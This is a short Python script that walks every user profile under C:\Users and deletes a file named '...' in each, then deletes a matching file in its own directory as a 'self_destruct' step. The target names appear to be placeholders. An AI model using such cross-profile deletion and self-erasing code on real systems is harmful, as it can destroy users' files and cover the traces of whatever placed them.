import os
ok=0
usernames=os.listdir(r'C:\Users')
possible_users=len(usernames)
for x in range(0,possible_users):
    user_to_try=usernames[x]
    try:
        os.remove('C:\\Users\\%s\\...'%(user_to_try))
        ok=1
    except OSError:
        0
if ok==1:
    direct=os.getcwd()
    self_destruct=direct+'\\...'
    os.remove(self_destruct)
